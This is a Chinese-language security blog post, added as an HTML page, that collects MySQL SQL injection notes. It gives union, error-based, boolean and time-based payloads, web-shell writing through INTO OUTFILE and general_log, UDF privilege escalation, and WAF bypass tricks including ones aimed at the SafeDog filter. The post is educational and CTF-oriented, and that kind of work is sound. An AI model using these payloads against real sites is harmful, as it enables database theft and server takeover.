@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+
+<title>
+  
+    Sqlinject小结
+  
+</title>
+
+<meta name="description" content="SQL注入笔记​    入坑比较晚的WEB狗，只能根据前人的经验慢慢积累。（持续更新中">
+<meta name="keywords" content="WEB">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Sqlinject小结">
+<meta property="og:url" content="http://spikesec.cn/2017/08/15/SqlInject小结/index.html">
+<meta property="og:site_name" content="Spike Security">
+<meta property="og:description" content="SQL注入笔记​    入坑比较晚的WEB狗，只能根据前人的经验慢慢积累。（持续更新中">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2018-04-13T13:36:06.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Sqlinject小结">
+<meta name="twitter:description" content="SQL注入笔记​    入坑比较晚的WEB狗，只能根据前人的经验慢慢积累。（持续更新中">
+
+
+  <link rel="alternative" href="/atom.xml" title="Spike Security" type="application/atom+xml">
+
+
+
+  <link rel="icon" href="/favicon.png">
+
+
+<link rel="stylesheet" href="/perfect-scrollbar/css/perfect-scrollbar.min.css">
+<link rel="stylesheet" href="/styles/main.css">
+
+
+
+
+
+
+</head>
+<body
+  
+    class="monochrome"
+  
+  >
+  <div class="mobile-header">
+  <button class="sidebar-toggle" type="button">
+    <span class="icon-bar"></span>
+    <span class="icon-bar"></span>
+    <span class="icon-bar"></span>
+  </button>
+  <a class="title" href="/">Spike Security</a>
+</div>
+
+  <div class="main-container">
+    <div class="sidebar">
+  <div class="header">
+    <h1 class="title"><a href="/">Spike Security</a></h1>
+    
+    <div class="info">
+      <div class="content">
+        
+        
+          <div class="author">Spike</div>
+        
+      </div>
+      
+        <div class="avatar">
+          
+            <a href="/about"><img src="/images/cc/avatar.jpeg"></a>
+          
+        </div>
+      
+    </div>
+  </div>
+  <div class="body">
+    
+      
+        <ul class="nav">
+          
+            
+              <li class="category-list-container">
+                <a href="javascript:;">Category</a>
+                
+              </li>
+            
+          
+            
+              <li class="tag-list-container">
+                <a href="javascript:;">Tag</a>
+                <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Security/">Security</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WEB/">WEB</a><span class="tag-list-count">11</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/other/">other</a><span class="tag-list-count">2</span></li></ul>
+              </li>
+            
+          
+            
+              <li class="archive-list-container">
+                <a href="javascript:;">Archive</a>
+                <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/">2018</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/">2017</a><span class="archive-list-count">10</span></li></ul>
+              </li>
+            
+          
+        </ul>
+      
+        <ul class="nav">
+          
+            
+              <li>
+                <a href="/" title="Homepage">Homepage</a>
+              </li>
+            
+          
+            
+              <li>
+                <a href="/archives" title="By Year">By Year</a>
+              </li>
+            
+          
+        </ul>
+      
+        <ul class="nav">
+          
+            
+              <li>
+                <a href="http://weibo.com/spikex" title="Weibo" target="_blank" rel="noopener">Weibo</a>
+              </li>
+            
+          
+            
+              <li>
+                <a href="https://github.com/SpikeI" title="Github" target="_blank" rel="noopener">Github</a>
+              </li>
+            
+          
+            
+              <li>
+                <a href="/atom.xml" title="RSS">RSS</a>
+              </li>
+            
+          
+        </ul>
+      
+    
+  </div>
+</div>
+
+    <div class="main-content">
+      
+        <div style="max-width: 1000px">
+      
+          <article id="post-SqlInject小结" class="article article-type-post">
+  
+    <h1 class="article-header">
+      Sqlinject小结
+    </h1>
+  
+  
+
+  <div class="article-info">
+    <span class="article-date">
+  2017-08-15
+</span>
+
+    
+
+    
+	<span class="article-tag tagcloud">
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/WEB/">WEB</a></li></ul>
+	</span>
+
+
+  </div>
+  <div class="article-entry">
+    <h2 id="SQL注入笔记"><a href="#SQL注入笔记" class="headerlink" title="SQL注入笔记"></a>SQL注入笔记</h2><p>​    入坑比较晚的WEB狗，只能根据前人的经验慢慢积累。（持续更新中</p>
+<a id="more"></a>
+<h2 id="1-常用的字段名"><a href="#1-常用的字段名" class="headerlink" title="1.常用的字段名"></a>1.常用的字段名</h2><p>​    下面是mysql的一些常用变量和一些内置函数，在搜集信息的时候可以用到</p>
+<p><strong>当前数据库</strong>:</p>
+<ul>
+<li>database()</li>
+</ul>
+<p><strong>版本</strong>:</p>
+<ul>
+<li>VERSION()</li>
+<li>@@version</li>
+<li>@@innodb_version</li>
+</ul>
+<p><strong>用户</strong>:</p>
+<ul>
+<li>USER()</li>
+<li>CURRENT_USER()</li>
+<li>SYSTEM_USER()</li>
+<li>SESSION_USER()</li>
+</ul>
+<p><strong>路径</strong>:</p>
+<ul>
+<li>@@BASEDIR : mysql安装路径：</li>
+<li>@@SLAVE_LOAD_TMPDIR : 临时文件夹路径：</li>
+<li>@@DATADIR : 数据存储路径：</li>
+<li>@@CHARACTER_SETS_DIR : 字符集设置文件路径</li>
+<li>@@LOG_ERROR : 错误日志文件路径：</li>
+<li>@@PID_FILE : pid-file文件路径</li>
+<li>@@BASEDIR : mysql安装路径：</li>
+<li>@@SLAVE_LOAD_TMPDIR : 临时文件夹路径：</li>
+</ul>
+<h2 id="2-注入的类型"><a href="#2-注入的类型" class="headerlink" title="2.注入的类型"></a>2.注入的类型</h2><h3 id="有回显的注入"><a href="#有回显的注入" class="headerlink" title="有回显的注入"></a>有回显的注入</h3><p>发现注入点后先通过order by判断返回列数，再通过select 1,2,3,4…判断显示的位置，最后将查询的语句替换到显示的位置上。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,(select table_name from information_schema.tables limit 0,1),3,4</span><br></pre></td></tr></table></figure>
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>和有回显的注入条件差不多，都可以将数据返回到页面上。暂时研究的不是很深入。</p>
+<p>常见的是利用<code>floor()</code>、<code>extractvalue()</code>、<code>updatexml()</code>等函数。</p>
+<p>如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id = 1 and (extractvalue(1, concat(0x7e,(select user()),0x7e)))</span><br></pre></td></tr></table></figure>
+<p>由于第二个参数是XPATH，服务器若有报错注入的诸如段，接收这样的输入后，会报一个叫<code>XPATH error</code>的错误。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: &apos;~root@localhost~&apos;</span><br></pre></td></tr></table></figure>
+<h3 id="Boolean型注入"><a href="#Boolean型注入" class="headerlink" title="Boolean型注入"></a>Boolean型注入</h3><p>Boolean型注入首先要有注入点，即可以执行sql语句的地方。</p>
+<p>其次在sql注入时查询成功和失败页面会有不同的返回：</p>
+<p>这样就可以通过判断语句进行猜词：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">select xxx from xxx where &apos;a&apos;=&apos;b&apos; or if(1,ascii(substr((select table_name from information_schema.tables limit 0,1),1,1))=1,1)</span><br><span class="line">select xxx from xxx where &apos;a&apos;=&apos;b&apos; or if(1,ascii(substr((select table_name from information_schema.tables limit 0,1),1,1))=2,1)</span><br><span class="line">...</span><br><span class="line">select xxx from xxx where &apos;a&apos;=&apos;b&apos; or if(1,ascii(substr((select table_name from information_schema.tables limit 0,1),2,1))=1,1)</span><br><span class="line">select xxx from xxx where &apos;a&apos;=&apos;b&apos; or if(1,ascii(substr((select table_name from information_schema.tables limit 0,1),2,1))=2,1)</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">其中</span><br><span class="line">select table_name from information_schema.tables limit 0,1是获取table表的第一个字段</span><br><span class="line">substr((select table_name from information_schema.tables limit 0,1),1,1)截取上述字段的第一个字母</span><br><span class="line">ascii(substr((select table_name from information_schema.tables limit 0,1),1,1))获得上述字母的ascii编码</span><br><span class="line">if(1,ascii(substr((select table_name from information_schema.tables limit 0,1),2,1))=2,1)对编码进行判断其中if(1,2,3)的意思为如果1=true，则返回2，否则返回3。该表达式直接返回判断结果</span><br></pre></td></tr></table></figure>
+<p>不用<code>,</code>的boolean型注入方法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ascii(mid((password)from(1)))=1</span><br></pre></td></tr></table></figure>
+<h3 id="Time-Base-sql注入"><a href="#Time-Base-sql注入" class="headerlink" title="Time-Base sql注入"></a>Time-Base sql注入</h3><p>当我们只能够执行sql语句但是没有回显时我们可以通过Time-base的sql注入进行利用。</p>
+<p>其原理是在sql语句中设置判断，如果判断通过则执行一个时间很长的语句，如果失败立即返回。如此就可以判断我们的条件是否通过。如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select xxx from xxx where username = &apos;asdqwr&apos; or if(ascii(substr((select table_name from information_schema.tables limit 0,1),1,1))=97,sleep(4),1)</span><br></pre></td></tr></table></figure>
+<p>如果页面等待约4秒才返回则information_schema.tables表中的第一个字段第一个母就是97，否则不是。</p>
+<p>这种sql注入需要的时间比较长，且受网络情况的影响比较大，不是很好利用。</p>
+<h2 id="3-注入技巧"><a href="#3-注入技巧" class="headerlink" title="3.注入技巧"></a>3.注入技巧</h2><h3 id="注释方法"><a href="#注释方法" class="headerlink" title="注释方法"></a>注释方法</h3><p>mysql的官方注释方法有<code>#</code>、<code>--</code>、<code>/*</code></p>
+<p>这三种注释方法在sql注入的时候都能够起到截断的作用，而且是通用的</p>
+<p>还有可以通过 ` 来进行注释，`在sql语句中的总用是包裹表名和列名的符号，有一个特点是在结尾的话不用闭合mysql也可以识别，所以可以把结尾的字符串包装成一个表名，以此来达到注释代码的目的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select password from user where username=&apos;admin&apos;</span><br><span class="line">select password from user order by @`where username =&apos;admin&apos;</span><br></pre></td></tr></table></figure>
+<p>加@是因为如果后面的表名不存在则会报错。</p>
+<p>如此一来后面的与就变成了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select password from user order by `where username = &apos;admin&apos;`</span><br><span class="line">// where username = &apos;admin&apos; 在这里指的是一个列名</span><br></pre></td></tr></table></figure>
+<h3 id="Getshell方法："><a href="#Getshell方法：" class="headerlink" title="Getshell方法："></a>Getshell方法：</h3><ol>
+<li><p>into outfile</p>
+<p>将查询内容导出到文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &apos;&lt;?php phpinfo();&apos; into outfile &apos;/var/www/html/a.php&apos;</span><br></pre></td></tr></table></figure>
+<p>但此种方法在5.7时需要在<code>my.ini</code>中设置<code>secure_file_priv</code></p>
+<p>并且只能够在<code>secure_file_priv</code>设置的路径下写文件</p>
+</li>
+<li><p>general_log_file</p>
+<p>通过设置logfile的方法来写文件，需要mysql的多句执行。</p>
+</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set global general_log=ON</span><br><span class="line">set global general_log_file=&apos;/var/www/html/a.php&apos;</span><br><span class="line">select &apos;&lt;?php phpinfo();&apos;</span><br></pre></td></tr></table></figure>
+<p>这两种通过mysql getshell的方法通常不好用，但可能会达到目的。</p>
+<ol start="3">
+<li><p>udf提权</p>
+<p>先上传一个dll文件，然后mysql加载其中的dll。dll的生成方法sqlmap中有，可以针对不同的操作系统生成对应的链接库文件。，举个栗子：</p>
+<p>在<code>sqlmap\extra\cloak\cloak</code>下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cloak.py -d -i D:\sqlmap\udf\mysql\windows\32\lib_mysqludf_sys.dll_</span><br></pre></td></tr></table></figure>
+<p>会生成32位的dll文件。将该文件传入服务器中后。</p>
+<p>执行下面代码会将函数导入(名字就是刚刚生成的dll文件)：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create function sys_eval returns string soname &apos;udf.dll&apos;;</span><br></pre></td></tr></table></figure>
+<p>然后就可以sys_eval()了。</p>
+</li>
+</ol>
+<ol start="4">
+<li><p>mof提权</p>
+<p>windows上的一种提权方式</p>
+<p>​</p>
+</li>
+</ol>
+<h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><p>​    一般做过滤的sql注入都是不安全的，因为使用了过滤都有被绕过的风险，曾经CTF比赛中比较流行一些SQL注入WAF的绕过。不过现在SQL编写的时候都会使用安全的参数绑定的方法，很多流行的框架中提供了框架自己的sql查询方式，也避免了SQL注入的发生。所以臭名昭著的SQL注入在将来并没有太强的的生命力。</p>
+<ol>
+<li>简单的删除用重写就可绕过，过滤空格可以使用<code>%09</code>、<code>/**/</code>等方法绕过，也可使用括号写一个不包括空格的payload：</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and 1=ascii(substr((select(username)from(user)),1,1))</span><br><span class="line">//substr 也可以用 MID函数代替</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>在之前的一次CTF比赛中出现了语义分析的waf绕过（忘了哪次了）。总之waf的原理大概是，通过语义分析给输入的语句进行语法分析，分析结果是威胁评分，一旦这个评分高于某个值就认定该语句为SQL注入。最后bypass的方法是输入很长的无关字符串降低评分如：</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc&apos; or 1=1 #</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>在mysql中：</li>
+</ol>
+<p>过滤空格可以用 <code>%09</code>，<code>%0a</code>,<code>${IFS}</code>代替</p>
+<p>可以利用环境变量中的字符(env命令查看环境变量)</p>
+<ol start="4">
+<li><p>格式化字符串sql注入：</p>
+<p>当连续使用两个sprintf的时候可能会引发这种漏洞：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1：$input = addslashes(&quot;%1$&apos; and 1=1#&quot;);</span><br><span class="line">2：$b = sprintf(&quot;AND b=&apos;%s&apos;&quot;, $input);</span><br><span class="line">...</span><br><span class="line">3：$sql = sprintf(&quot;SELECT * FROM t WHERE a=&apos;%s&apos; $b&quot;, &apos;admin&apos;);</span><br></pre></td></tr></table></figure>
+<p>这里利用到了sprintf中的格式化语法<code>$1%x</code>,其中<code>$1</code>表示了取第一个参数，<code>$x</code>表示展示的格式，比如<code>$04d</code>表示4位整数，空位用<code>0</code>填充。</p>
+<p>当知道了这样的语法后我们来了解一下其中的’bug’：在特殊的格式化中<code>$</code>可以‘吃掉’一些特殊字符，如<code>&#39;</code>和<code>\</code>这种敏感字符。</p>
+<p>第一行中注入的单引号被转义，加入<code>\</code>，第二句字符串加入<code>$b</code>，第三句将<code>$b</code>直接加入了格式化字符串的母字符串中，此时字符串中的<code>$1%\</code>被当做</p>
+<p>参考<a href="https://paper.seebug.org/386/" target="_blank" rel="noopener">https://paper.seebug.org/386/</a></p>
+</li>
+<li><p>过安全狗（mark未测试）：</p>
+</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/*!12345select*/</span><br><span class="line">/!*0/!*select*/*/</span><br></pre></td></tr></table></figure>
+<ol start="6">
+<li><p>当information_schema被过滤时，可以使用innodb引擎进行注入：<code>mysql.innodb_table_stats</code></p>
+<p>出自：<a href="http://www.zhutougg.com/2017/04/25/mysqlshu-ju-ku-de-innodbyin-qing-de-zhu-ru/" target="_blank" rel="noopener">http://www.zhutougg.com/2017/04/25/mysqlshu-ju-ku-de-innodbyin-qing-de-zhu-ru/</a></p>
+</li>
+</ol>
+<h3 id="可报错时爆破表名，库名"><a href="#可报错时爆破表名，库名" class="headerlink" title="可报错时爆破表名，库名"></a>可报错时爆破表名，库名</h3><p>​    <strong>列名</strong>:</p>
+<p>​    当存在sql注入且information_schema、database、table、column等被过滤时，我们可以通过报错的方法进行注入。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select `UserName` from `user` where id=1 and (select * from (select * from `user` as a join `user` as b using(id,UserName,`PassWord`)) as c);</span><br></pre></td></tr></table></figure>
+<p>​    因为两个表join后因为有相同的列名，在进行后续查询时会因为列明冲突而报错。这个过程中就会把列名反馈到报错信息中。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Err] 1060 - Duplicate column name &apos;Auth&apos;</span><br></pre></td></tr></table></figure>
+<p>​    <strong>表名</strong>:</p>
+<p>​    mysql中有一个叫Polygon的函数，传入的参数为LineString类型的变量，如果参数不表示LineString，那么返回值就是NULL</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select `UserName` from `user` where id=1 and Polygon(id)</span><br></pre></td></tr></table></figure>
+<p>​    如果我们传入的是已知的列，那么就会报错将库、表、列爆出来。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Err] 1367 - Illegal non geometric &apos;`test`.`user`.`id`&apos; value found during parsing</span><br></pre></td></tr></table></figure>
+<p>​    函数也可用：</p>
+<p>​    multiPolygon(id)</p>
+<p>​    multilinestring(id)</p>
+<p>​    GeometryCollection(id)</p>
+<p>​    MultiPoint(id)</p>
+<p>​    linestring(id)</p>
+<p>​    <strong>库名</strong>:</p>
+<p>​    在查询语句中调用一个未定义的函数，如果函数不存在就会爆出这个库不存在此函数。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[SQL]select `UserName` from `user` where id=1-a()</span><br><span class="line"></span><br><span class="line">[Err] 1305 - FUNCTION test.a does not exist</span><br></pre></td></tr></table></figure>
+<h3 id="未知列名的注入"><a href="#未知列名的注入" class="headerlink" title="未知列名的注入"></a>未知列名的注入</h3><p>​    首先试出列的数量：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BASE: select `username` from `user` where id=1</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select `UserName` from `user` where id = 1 union select 1 from (select 1,2,3,4,5,6,7,8,9,0,11,12 union select * from `user`)a</span><br></pre></td></tr></table></figure>
+<p>​    尝试读出数据：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">select `username` from `user` where id=1 union (select a.3 from (select 1,2,3,4,5,6,7,8,9,0,11,12 union select * from `user`)a limit 2 offset 1)</span><br><span class="line">=&gt;</span><br><span class="line">+----------------------------------+</span><br><span class="line">| username                         |</span><br><span class="line">+----------------------------------+</span><br><span class="line">| spiket                           |</span><br><span class="line">| ****f44b13955235245b2497399d**** |</span><br><span class="line">+----------------------------------+</span><br></pre></td></tr></table></figure>
+<p>​    </p>
+<p>参考：</p>
+<p><a href="http://www.yulegeyu.com/2017/04/11/%E4%B8%BA%E4%BB%80%E4%B9%88-backtick-%E8%83%BD%E5%81%9A%E6%B3%A8%E9%87%8A%E7%AC%A6/" target="_blank" rel="noopener">http://www.yulegeyu.com/2017/04/11/%E4%B8%BA%E4%BB%80%E4%B9%88-backtick-%E8%83%BD%E5%81%9A%E6%B3%A8%E9%87%8A%E7%AC%A6/</a></p>
+
+  </div>
+  <footer class="article-footer">
+    
+  <div class="cc">
+    <a href="http://creativecommons.org/licenses/by-sa/4.0/deed.en" target="_blank" title="Attribution-ShareAlike">
+      <img src="/images/cc/cc.png">
+      
+          <img src="/images/cc/by.png">
+        
+          <img src="/images/cc/sa.png">
+      
+      <span>
+        This work is licensed under a Creative Commons Attribution-ShareAlike 4.0 International License.
+      </span>
+    </a>
+  </div>
+
+
+    
+
+  </footer>
+</article>
+
+
+
+
+
+
+
+          <div class="main-footer">
+  
+    © 2018 Spike Security - Powered by <a href="http://hexo.io" target="_blank">Hexo</a> - Theme <a href="https://github.com/denjones/hexo-theme-chan" target="_blank">Chan</a>
+  
+</div>
+
+      
+        </div>
+      
+    </div>
+  </div>
+  <script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+
+  <link rel="stylesheet" href="/PhotoSwipe/photoswipe.css">
+  <link rel="stylesheet" href="/PhotoSwipe/default-skin/default-skin.css">
+
+  <!-- Root element of PhotoSwipe. Must have class pswp. -->
+  <div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe.
+             It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+      <!-- Container that holds slides.
+                PhotoSwipe keeps only 3 of them in the DOM to save memory.
+                Don't modify these 3 pswp__item elements, data is added later on. -->
+      <div class="pswp__container">
+        <div class="pswp__item"></div>
+        <div class="pswp__item"></div>
+        <div class="pswp__item"></div>
+      </div>
+
+      <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+      <div class="pswp__ui pswp__ui--hidden">
+
+        <div class="pswp__top-bar">
+
+          <!--  Controls are self-explanatory. Order can be changed. -->
+
+          <div class="pswp__counter"></div>
+
+          <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+          <button class="pswp__button pswp__button--share" title="Share"></button>
+
+          <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+          <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+          <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+          <!-- element will get class pswp__preloader--active when preloader is running -->
+          <div class="pswp__preloader">
+            <div class="pswp__preloader__icn">
+              <div class="pswp__preloader__cut">
+                <div class="pswp__preloader__donut"></div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+          <div class="pswp__share-tooltip"></div>
+        </div>
+
+        <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
+
+        <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button>
+
+        <div class="pswp__caption">
+          <div class="pswp__caption__center"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script src="/PhotoSwipe/photoswipe.js"></script>
+  <script src="/PhotoSwipe/photoswipe-ui-default.js"></script>
+
+
+<script src="/perfect-scrollbar/js/min/perfect-scrollbar.min.js"></script>
+<script src="/scripts/main.js"></script>
+
+</body>
+</html>
